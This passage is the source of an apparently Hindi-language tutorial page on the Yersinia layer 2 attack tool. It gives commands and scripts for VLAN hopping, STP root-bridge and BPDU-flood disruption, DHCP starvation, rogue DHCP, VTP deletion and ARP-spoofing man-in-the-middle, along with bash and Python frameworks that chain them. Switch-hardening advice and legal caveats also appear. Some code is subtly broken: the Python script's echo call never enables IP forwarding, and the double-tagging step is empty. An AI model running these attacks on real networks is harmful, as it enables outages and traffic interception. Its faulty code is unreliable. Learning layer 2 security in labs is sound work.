      <h3>Strategy 2: VLAN Hopping Attack</h3>
      <CodeBlock
        title="VLAN हॉपिंग"
        code={`# चरण 1: DTP ट्रंक नेगोशिएशन
# ट्रंक लिंक स्थापित करो
yersinia dtp -attack 1

# चरण 2: 802.1Q टैगिंग
# लक्ष्य VLAN पर ट्रैफ़िक भेजो
# डबल टैगिंग अटैक:

# चरण 3: ट्रैफ़िक कैप्चर
# सभी VLAN का ट्रैफ़िक कैप्चर करो
tcpdump -i eth0 -w vlan_hop.pcap

# चरण 4: VLAN गणना
# कौन-कौन से VLAN हैं वो पता करो`}
      />

      <h3>Strategy 3: Network Disruption</h3>
      <CodeBlock
        title="नेटवर्क विघटन"
        code={`# चरण 1: STP रूट ब्रिज अटैक
# नेटवर्क का रूट ब्रिज बनो
yersinia stp -attack 1

# चरण 2: BPDU फ्लड
# स्विच टेबल ओवरफ़्लो करो
yersinia stp -attack 2

# चरण 3: DHCP स्टार्वेशन
# IP पते समाप्त करो
yersinia dhcp -attack 1

# चरण 4: VTP डिलीट (सिस्को नेटवर्क)
# VLAN कॉन्फ़िगरेशन हटाओ
yersinia vtp -attack 1

# परिणाम: पूरा नेटवर्क बंद हो जाएगा`}
      />

      <h2>Other Tools with Yersinia</h2>
      <p>
        येर्सिनिया अकेला भी शक्तिशाली है, लेकिन अन्य टूल के साथ मिलाकर और अधिक प्रभावी हो जाता है:
      </p>

      <h3>Wireshark — Traffic Analysis</h3>
      <p>
        येर्सिनिया के अटैक के बाद Wireshark से ट्रैफ़िक विश्लेषण करो। Wireshark पैकेट डिकोड करता है और विस्तृत जानकारी देता है।
      </p>
      <CodeBlock
        title="Wireshark इंटीग्रेशन"
        code={`# येर्सिनिया अटैक के साथ ट्रैफ़िक कैप्चर:
tcpdump -i eth0 -w yersinia_traffic.pcap

# Wireshark में खोलें:
wireshark yersinia_traffic.pcap

# या tshark से कमांड लाइन विश्लेषण:
tshark -r yersinia_traffic.pcap -Y "stp"
tshark -r yersinia_traffic.pcap -Y "dhcp"
tshark -r yersinia_traffic.pcap -Y "cdp"`}
      />

      <h3>Ettercap — MITM</h3>
      <p>
        येर्सिनिया के DHCP अटैक के बाद Ettercap से पूर्ण MITM सेटअप करो।
      </p>
      <CodeBlock
        title="Ettercap इंटीग्रेशन"
        code={`# येर्सिनिया से रोग DHCP शुरू करो
yersinia dhcp -attack 2

# Ettercap से ARP स्पूफ़िंग:
ettercap -T -i eth0 -M arp:remote /<victim>// /<gateway>//

# ट्रैफ़िक अग्रेषण:
# Ettercap स्वचालित रूप से ट्रैफ़िक अग्रेषित करेगा`}
      />

      <h3>Arpspoof — ARP Spoofing</h3>
      <CodeBlock
        title="Arpspoof इंटीग्रेशन"
        code={`# IP फॉरवर्डिंग सक्षम करें:
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP स्पूफ़िंग:
arpspoof -i eth0 -t <victim_ip> <gateway_ip>
arpspoof -i eth0 -t <gateway_ip> <victim_ip>

# येर्सिनिया के बाद ट्रैफ़िक कैप्चर:
tcpdump -i eth0 -w spoofed.pcap`}
      />

      <h2>GUI Mode Detailed Guide</h2>
      <p>
        येर्सिनिया का GUI मोड GTK टूलकिट पर आधारित है। शुरुआती लोगों के लिए यह मोड सबसे अच्छा है क्योंकि सब कुछ विज़ुअल रूप में दिखता है।
      </p>

      <CodeBlock
        title="GUI मोड चरण"
        code={`# GUI मोड शुरू करें:
sudo yersinia -G

# GUI में:
# 1. मेन्यू बार से इंटरफ़ेस चुनें
# 2. प्रोटोकॉल टैब चुनें (STP, CDP, DHCP, आदि)
# 3. अटैक प्रकार चुनें ड्रॉपडाउन से
# 4. पैरामीटर कॉन्फ़िगर करें
# 5. "लॉन्च अटैक" बटन क्लिक करें
# 6. परिणाम टैब में अटैक परिणाम देखें
# 7. लॉग टैब में विस्तृत लॉग देखें`}
      />

      <h2>Daemon Mode</h2>
      <p>
        डेमन मोड में येर्सिनिया बैकग्राउंड में चलता है। यह मोड स्वचालित अटैक या लंबे समय तक चलने वाले ऑपरेशन के लिए उपयोगी है।
      </p>

      <CodeBlock
        title="डेमन मोड"
        code={`# डेमन मोड शुरू करें:
sudo yersinia -D

# डेमन मोड विशेषताएं:
# - बैकग्राउंड में चलता है
# - लॉग फ़ाइल में परिणाम सहेजता है
# - कई इंटरफ़ेस पर एक साथ काम करता है
# - स्वचालित अटैक स्क्रिप्ट के लिए उपयोगी

# लॉग फ़ाइल जांचें:
tail -f /var/log/yersinia.log

# डेमन बंद करें:
killall yersinia`}
      />

      <h2>Attack Detection and Defense</h2>
      <p>
        यदि आप नेटवर्क प्रशासक हो, तो येर्सिनिया के अटैक को कैसे पहचानोगे और रोकोगे:
      </p>

      <h3>STP Attack Detection</h3>
      <CodeBlock
        title="STP अटैक पहचान"
        code={`# सिस्को स्विच पर STP स्थिति जांचें:
show spanning-tree

# रूट ब्रिज जांचें:
# यदि अज्ञात ब्रिज ID रूट है, तो अटैक है

# BPDU गार्ड सक्षम करें:
interface range fa0/1-24
 spanning-tree bpduguard enable

# रूट गार्ड सक्षम करें:
spanning-tree rootguard

# STP अटैक पहचान स्क्रिप्ट:
#!/bin/bash
# STP मॉनिटरिंग स्क्रिप्ट
while true; do
    tcpdump -i eth0 -c 10 'stp' 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "STP ट्रैफ़िक पाया गया — अटैक जांचें"
    fi
    sleep 5
done`}
      />

      <h3>DHCP Attack Detection</h3>
      <CodeBlock
        title="DHCP अटैक पहचान"
        code={`# DHCP स्नूपिंग सक्षम करें (सिस्को):
ip dhcp snooping
ip dhcp snooping vlan 1-100

# DHCP दर सीमा:
interface fa0/1
 ip dhcp snooping limit rate 10

# रोग DHCP पहचान:
# कई DHCP सर्वर पहचानें
dhcpdump -i eth0

# DHCP अटैक मॉनिटरिंग:
#!/bin/bash
# DHCP ट्रैफ़िक मॉनिटर करें
tcpdump -i eth0 port 67 or port 68 -w dhcp_monitor.pcap`}
      />

      <h3>CDP Attack Detection</h3>
      <CodeBlock
        title="CDP अटैक पहचान"
        code={`# CDP अक्षम करें यदि जरूरत नहीं:
no cdp run

# या विशिष्ट इंटरफ़ेस पर:
interface fa0/1
 no cdp enable

# CDP मॉनिटरिंग:
show cdp neighbors
show cdp traffic`}
      />

      <h3>DTP Attack Detection</h3>
      <CodeBlock
        title="DTP अटैक पहचान"
        code={`# DTP अक्षम करें:
interface fa0/1
 switchport mode access
 switchport nonegotiate

# ट्रंक पोर्ट मैन्युअल कॉन्फ़िगर करें:
interface fa0/24
 switchport mode trunk
 switchport trunk allowed vlan 10,20,30`}
      />

      <h3>HSRP Attack Detection</h3>
      <CodeBlock
        title="HSRP अटैक पहचान"
        code={`# HSRP प्रमाणीकरण सक्षम करें:
standby 1 authentication md5 key-string <password>

# HSRP स्थिति जांचें:
show standby

# HSRP मॉनिटरिंग:
# अज्ञात HSRP प्राथमिकता पहचानें
tcpdump -i eth0 'host 224.0.0.2'`}
      />

      <h3>VTP Attack Detection</h3>
      <CodeBlock
        title="VTP अटैक पहचान"
        code={`# VTP पासवर्ड सेट करें:
vtp password <strong_password>

# VTP मोड ट्रांसपेरेंट करें:
vtp mode transparent

# VTP स्थिति जांचें:
show vtp status

# VTP कॉन्फ़िगरेशन बैकअप:
show vlan brief > vlan_backup.txt`}
      />

      <h2>Yersinia Configuration</h2>
      <p>
        येर्सिनिया का कॉन्फ़िगरेशन फ़ाइल होता है जिसमें आप डिफ़ॉल्ट सेटिंग बदल सकते हो।
      </p>

      <CodeBlock
        title="कॉन्फ़िगरेशन फ़ाइल"
        code={`# कॉन्फ़िगरेशन फ़ाइल स्थान:
/etc/yersinia/yersinia.conf

# या बनाओ:
mkdir -p ~/.yersinia
cp /etc/yersinia/yersinia.conf ~/.yersinia/

# कॉन्फ़िगरेशन विकल्प:
# - डिफ़ॉल्ट इंटरफ़ेस
# - अटैक पैरामीटर
# - लॉगिंग सेटिंग
# - GUI प्राथमिकताएं

# कॉन्फ़िगरेशन फ़ाइल संपादित करें:
nano ~/.yersinia/yersinia.conf`}
      />

      <h2>Yersinia Scripting</h2>
      <p>
        येर्सिनिया को स्क्रिप्ट के साथ स्वचालित कर सकते हो। बैश स्क्रिप्ट से कई अटैक क्रम में चला सकते हो।
      </p>

      <CodeBlock
        title="स्वचालन स्क्रिप्ट"
        code={`#!/bin/bash
# येर्सिनिया स्वचालन स्क्रिप्ट

INTERFACE="eth0"
echo "[*] लेयर 2 अटैक स्वचालन शुरू हो रहा है..."

# चरण 1: नेटवर्क टोह
echo "[*] चरण 1: टोह"
yersinia cdp -attack 1 &
sleep 10
kill %1

# चरण 2: DHCP स्टार्वेशन
echo "[*] चरण 2: DHCP स्टार्वेशन"
yersinia dhcp -attack 1 &
sleep 30
kill %1

# चरण 3: रोग DHCP
echo "[*] चरण 3: रोग DHCP सर्वर"
yersinia dhcp -attack 2 &
sleep 5

# चरण 4: MITM सेटअप
echo "[*] चरण 4: MITM सेटअप"
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i $INTERFACE -t 192.168.1.10 192.168.1.1 &
arpspoof -i $INTERFACE -t 192.168.1.1 192.168.1.10 &

# चरण 5: ट्रैफ़िक कैप्चर
echo "[*] चरण 5: ट्रैफ़िक कैप्चर"
tcpdump -i $INTERFACE -w attack_capture.pcap

echo "[*] अटैक पूरा!"`}
      />

      <h2>Common Problems and Solutions</h2>

      <h3>Problem 1: Permission Denied</h3>
      <CodeBlock
        title="अनुमति समाधान"
        code={`# रूट विशेषाधिकार चाहिए:
sudo yersinia -I

# या रूट उपयोगकर्ता बनो:
sudo su
yersinia -I`}
      />

      <h3>Problem 2: Interface Not Found</h3>
      <CodeBlock
        title="इंटरफ़ेस समाधान"
        code={`# उपलब्ध इंटरफ़ेस जांचें:
ip link show
ifconfig -a

# सही इंटरफ़ेस नाम उपयोग करें:
yersinia -I -i <interface_name>`}
      />

      <h3>Problem 3: No Traffic Captured</h3>
      <CodeBlock
        title="कैप्चर समाधान"
        code={`# प्रॉमिस्क्यूअस मोड सक्षम करें:
ip link set eth0 promisc on

# सत्यापित करें:
ip link show eth0

# इंटरफ़ेस चालू करें:
ip link set eth0 up`}
      />

      <h3>Problem 4: Attack Not Working</h3>
      <CodeBlock
        title="अटैक डिबग"
        code={`# डिबग मोड में चलाओ:
yersinia -I -d

# लॉग फ़ाइल जांचें:
tail -f /var/log/yersinia.log

# इंटरफ़ेस स्थिति जांचें:
tcpdump -i eth0 -c 10

# नेटवर्क कनेक्टिविटी जांचें:
ping <target_ip>`}
      />

      <h2>Real-World Case Studies</h2>

      <h3>Case Study 1: Corporate Network Attack</h3>
      <p>
        एक पेनेट्रेशन टेस्ट में टेस्टर ने येर्सिनिया उपयोग किया कॉर्पोरेट नेटवर्क पर। पहले CDP स्पूफ़िंग से नेटवर्क मैप बनाया। फिर DHCP स्टार्वेशन + रोग DHCP से MITM सेटअप किया। परिणाम: 200 कर्मचारियों का ट्रैफ़िक कैप्चर हुआ, संवेदनशील डेटा मिला, और नेटवर्क पूरी तरह से समझौता हो गया।
      </p>

      <h3>Case Study 2: VLAN Hopping</h3>
      <p>
        एक वित्तीय कंपनी में टेस्टर ने DTP ट्रंक नेगोशिएशन से VLAN हॉपिंग किया। वित्त VLAN तक पहुंच मिली और लेनदेन डेटा कैप्चर हुआ। कंपनी को पता भी नहीं चला।
      </p>

      <h3>Case Study 3: Network Disruption</h3>
      <p>
        एक रेड टीम अभ्यास में टीम ने येर्सिनिया से STP रूट ब्रिज अटैक किया। पूरा नेटवर्क 30 मिनट के लिए बंद हो गया। रिकवरी में 4 घंटे लगे।
      </p>

      <h2>Legal and Ethical Considerations</h2>
      <p>
        येर्सिनिया उपयोग करते समय ये कानूनी और नैतिक नियम याद रखो:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">लिखित प्राधिकरण:</strong> हमेशा लिखित अनुमति लो परीक्षण से पहले</li>
        <li><strong className="text-white">दायरा परिभाषित करो:</strong> क्या परीक्षण करना है वो पहले से परिभाषित करो</li>
        <li><strong className="text-white">प्रभाव मूल्यांकन:</strong> अटैक का संभावित प्रभाव समझो</li>
        <li><strong className="text-white">रिकवरी योजना:</strong> अटैक के बाद रिकवरी की योजना तैयार रखो</li>
        <li><strong className="text-white">दस्तावेज़ीकरण:</strong> सब कुछ दस्तावेज़ करो</li>
        <li><strong className="text-white">कानूनी समीक्षा:</strong> कानूनी टीम से समीक्षा कराओ</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        येर्सिनिया अभ्यास के लिए लैब वातावरण सेटअप करो। वास्तविक नेटवर्क पर बिना अनुमति के कभी परीक्षण मत करो।
      </p>

      <CodeBlock
        title="GNS3 के साथ लैब सेटअप"
        code={`# GNS3 इंस्टॉल करो:
# https://gns3.com/downloads

# वर्चुअल मशीन सेटअप करो:
# 1. Kali Linux (अटैकर)
# 2. Cisco IOS (स्विच/राउटर)
# 3. Ubuntu (पीड़ित)

# नेटवर्क टोपोलॉजी:
# Kali <---> Cisco Switch <---> Ubuntu

# येर्सिनिया अभ्यास:
# सभी अटैक सुरक्षित रूप से आज़माओ`}
      />

      <CodeBlock
        title="VirtualBox के साथ लैब सेटअप"
        code={`# VirtualBox इंस्टॉल करो:
sudo apt install virtualbox

# VM बनाओ:
# 1. Kali Linux VM (अटैकर)
# 2. Ubuntu VM (पीड़ित)
# 3. pfSense VM (राउटर)

# नेटवर्क:
# इंटरनल नेटवर्क मोड उपयोग करो
# सभी VM एक ही इंटरनल नेटवर्क पर हों

# येर्सिनिया अभ्यास:
# STP, DHCP, CDP अटैक आज़माओ`}
      />

      <h2>Performance Tuning</h2>
      <p>
        येर्सिनिया का प्रदर्शन सुधारने के लिए:
      </p>

      <CodeBlock
        title="प्रदर्शन टिप्स"
        code={`# 1. सही इंटरफ़ेस चुनो
# गीगाबिट इंटरफ़ेस उपयोग करो यदि हो

# 2. बफ़र आकार बढ़ाओ:
# कॉन्फ़िगरेशन फ़ाइल में बफ़र आकार बढ़ाओ

# 3. लॉग स्तर कम करो:
# केवल महत्वपूर्ण घटनाएं लॉग करो

# 4. कई इंटरफ़ेस:
# अलग-अलग अटैक के लिए अलग इंटरफ़ेस उपयोग करो

# 5. CPU एफ़िनिटी सेट करो:
taskset -c 0 yersinia -I`}
      />

      <h2>Comparison with Other Tools</h2>
      <p>
        येर्सिनिया के अलावा भी लेयर 2 अटैक टूल हैं:
      </p>

      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">प्रोटोकॉल</th>
              <th className="text-left py-2 px-3 text-neon-green">फ़ायदा</th>
              <th className="text-left py-2 px-3 text-neon-green">नुकसान</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">येर्सिनिया</td><td>STP, CDP, DHCP, DTP, HSRP, VTP</td><td>ऑल-इन-वन टूल, GUI समर्थन</td><td>पुराना प्रोजेक्ट, सीमित अपडेट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Ettercap</td><td>ARP, DHCP, ICMP</td><td>MITM केंद्रित, प्लगइन समर्थन</td><td>सीमित लेयर 2 अटैक</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Scapy</td><td>कस्टम पैकेट</td><td>अधिकतम लचीलापन</td><td>जटिल स्क्रिप्टिंग आवश्यक</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Macof</td><td>MAC फ्लडिंग</td><td>सरल, तेज़</td><td>केवल MAC फ्लडिंग</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Frequently Asked Questions</h2>

      <h3>क्या येर्सिनिया Windows पर चलता है?</h3>
      <p>
        नहीं, येर्सिनिया केवल Linux पर चलता है। Windows पर उपयोग करने के लिए VM में Kali Linux इंस्टॉल करो।
      </p>

      <h3>क्या येर्सिनिया वायरलेस नेटवर्क पर काम करता है?</h3>
      <p>
        हां, लेकिन वायरलेस इंटरफ़ेस को मॉनिटर मोड में सेट करना पड़ता है। वायरलेस अटैक के लिए बेहतर टूल हैं जैसे Aircrack-ng।
      </p>

      <h3>क्या येर्सिनिया से इंटरनेट हैक हो सकता है?</h3>
      <p>
        नहीं, येर्सिनिया केवल लोकल नेटवर्क (लेयर 2) पर काम करता है। इंटरनेट के लिए अलग टूल चाहिए।
      </p>

      <h3>क्या येर्सिनिया पकड़ा जा सकता है?</h3>
      <p>
        हां, उचित IDS/IPS और नेटवर्क मॉनिटरिंग से पकड़ा जा सकता है। STP गार्ड, DHCP स्नूपिंग, CDP सुरक्षा से रोका जा सकता है।
      </p>

      <h3>क्या येर्सिनिया कानूनी है?</h3>
      <p>
        टूल कानूनी है, लेकिन बिना अनुमति के उपयोग करना अवैध है। केवल अधिकृत परीक्षण में उपयोग करें।
      </p>

      <h2>Alternatives to Yersinia</h2>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Scapy:</strong> कस्टम पैकेट बनाने के लिए सर्वोत्तम</li>
        <li><strong className="text-white">Ettercap:</strong> MITM अटैक के लिए सर्वोत्तम</li>
        <li><strong className="text-white">Bettercap:</strong> आधुनिक विकल्प, वायरलेस भी समर्थन करता है</li>
        <li><strong className="text-white">Macof:</strong> MAC फ्लडिंग के लिए सरल टूल</li>
        <li><strong className="text-white">Lodine:</strong> लेयर 2 टनलिंग के लिए</li>
      </ul>

      <h2>उन्नत तकनीकें</h2>

      <h3>कस्टम पैकेट बनाना</h3>
      <p>
        येर्सिनिया के साथ Scapy उपयोग करके कस्टम पैकेट बना सकते हो:
      </p>

      <CodeBlock
        title="Scapy इंटीग्रेशन"
        code={`# Python में Scapy:
from scapy.all import *

# कस्टम STP फ्रेम:
stp_frame = Ether(dst="01:80:c2:00:00:00")/ \\
            LLC()/ \\
            STP(rootid=0, rootmac="00:00:00:00:00:01", \\
                bridgeid=0, bridgemac="00:00:00:00:00:01")

# भेजो:
sendp(stp_frame, iface="eth0")

# कस्टम DHCP फ्रेम:
dhcp_frame = Ether(dst="ff:ff:ff:ff:ff:ff")/ \\
             IP(src="0.0.0.0", dst="255.255.255.255")/ \\
             UDP(sport=68, dport=67)/ \\
             BOOTP(chaddr="aa:bb:cc:dd:ee:ff")/ \\
             DHCP(options=[("message-type","discover"),"end"])

sendp(dhcp_frame, iface="eth0")`}
      />

      <h3>स्वचालित अटैक फ्रेमवर्क</h3>
      <CodeBlock
        title="स्वचालन फ्रेमवर्क"
        code={`#!/usr/bin/env python3
# येर्सिनिया स्वचालन फ्रेमवर्क

import subprocess
import time
import sys

class YersiniaAttack:
    def __init__(self, interface):
        self.interface = interface

    def dhcp_starvation(self, duration=30):
        """DHCP स्टार्वेशन अटैक"""
        print(f"[*] {self.interface} पर DHCP स्टार्वेशन शुरू हो रहा है")
        proc = subprocess.Popen(
            ["yersinia", "dhcp", "-attack", "1"],
            stdout=subprocess.DEVNULL
        )
        time.sleep(duration)
        proc.terminate()
        print("[*] DHCP स्टार्वेशन पूरा")

    def rogue_dhcp(self):
        """रोग DHCP सर्वर"""
        print("[*] रोग DHCP सर्वर शुरू हो रहा है")
        proc = subprocess.Popen(
            ["yersinia", "dhcp", "-attack", "2"],
            stdout=subprocess.DEVNULL
        )
        return proc

    def stp_root_bridge(self):
        """STP रूट ब्रिज अटैक"""
        print("[*] STP रूट ब्रिज अटैक शुरू हो रहा है")
        proc = subprocess.Popen(
            ["yersinia", "stp", "-attack", "1"],
            stdout=subprocess.DEVNULL
        )
        return proc

    def full_attack(self):
        """पूर्ण अटैक श्रृंखला"""
        print("[*] पूर्ण अटैक श्रृंखला शुरू हो रही है...")

        # चरण 1: टोह
        print("[*] चरण 1: टोह")

        # चरण 2: DHCP स्टार्वेशन
        print("[*] चरण 2: DHCP स्टार्वेशन")
        self.dhcp_starvation(30)

        # चरण 3: रोग DHCP
        print("[*] चरण 3: रोग DHCP")
        rogue = self.rogue_dhcp()
        time.sleep(5)

        # चरण 4: STP अटैक
        print("[*] चरण 4: STP अटैक")
        stp = self.stp_root_bridge()

        # चरण 5: MITM
        print("[*] चरण 5: MITM सेटअप")
        subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])

        print("[*] अटैक चल रहा है... बंद करने के लिए Ctrl+C दबाएं")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            rogue.terminate()
            stp.terminate()
            print("[*] अटैक बंद")

if __name__ == "__main__":
    attack = YersiniaAttack("eth0")
    attack.full_attack()`}
      />

      <h2>रिपोर्टिंग</h2>
      <p>
        पेनेट्रेशन टेस्ट के बाद उचित रिपोर्ट बनाना ज़रूरी है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">कार्यकारी सारांश:</strong> उच्च-स्तरीय निष्कर्ष</li>
        <li><strong className="text-white">तकनीकी विवरण:</strong> अटैक कार्यप्रणाली और परिणाम</li>
        <li><strong className="text-white">साक्ष्य:</strong> कैप्चर किए गए पैकेट, स्क्रीनशॉट, लॉग</li>
        <li><strong className="text-white">जोखिम मूल्यांकन:</strong> गंभीरता और प्रभाव विश्लेषण</li>
        <li><strong className="text-white">उपचार:</strong> सुधार सिफारिशें</li>
      </ul>

      <h2>निष्कर्ष</h2>
      <p>
        येर्सिनिया एक शक्तिशाली लेयर 2 अटैक टूल है जो स्विच-आधारित नेटवर्क को टारगेट करता है। यह टूल STP, CDP, DHCP, DTP, HSRP, और VTP जैसे प्रोटोकॉल पर अटैक करता है। कॉर्पोरेट नेटवर्क में लेयर 2 अटैक बहुत प्रभावी होते हैं क्योंकि ज्यादातर सुरक्षा टीमें लेयर 2 सुरक्षा को नज़रअंदाज़ करती हैं।
      </p>
      <p>
        याद रखो — येर्सिनिया केवल अधिकृत परीक्षण के लिए उपयोग करो। बिना अनुमति के नेटवर्क अटैक करना अवैध है। लैब वातावरण में अभ्यास करो और उचित प्राधिकरण के साथ ही वास्तविक नेटवर्क पर परीक्षण करो।
      </p>

      <div className="success-box mt-8">
        <strong>✅ प्रो टिप्स:</strong>
        <ul className="list-disc list-inside mt-2 space-y-1">
          <li>DHCP स्टार्वेशन + रोग DHCP कॉम्बो से MITM हो जाता है</li>
          <li>STP रूट ब्रिज अटैक से पूरा नेटवर्क ट्रैफ़िक कैप्चर कर सकते हो</li>
          <li>DTP ट्रंक नेगोशिएशन से VLAN हॉपिंग संभव है</li>
          <li>HSRP हाईजैक से डिफ़ॉल्ट गेटवे नियंत्रण मिलता है</li>
          <li>VTP डिलीट से पूरा VLAN कॉन्फ़िगरेशन हट सकता है</li>
          <li>लेयर 2 अटैक कॉर्पोरेट नेटवर्क में बहुत प्रभावी हैं</li>
          <li>हमेशा लैब वातावरण में अभ्यास करो पहले</li>
          <li>बचाव तकनीकें भी सीखो — DHCP स्नूपिंग, STP गार्ड, आदि</li>
        </ul>
      </div>

      <div className="warning-box mt-4">
        <strong>⚠️ अंतिम चेतावनी:</strong> नेटवर्क प्रोटोकॉल अटैक गंभीर नुकसान कर सकते हैं। सेवाएं बाधित हो सकती हैं, डेटा लॉस हो सकता है, और नेटवर्क इंफ्रास्ट्रक्चर क्षतिग्रस्त हो सकता है। केवल अधिकृत परीक्षण में उपयोग करें। हमेशा रिकवरी योजना तैयार रखो। दस्तावेज़ीकरण बनाए रखो।
      </div>
    </TutorialLayout>
  )
}
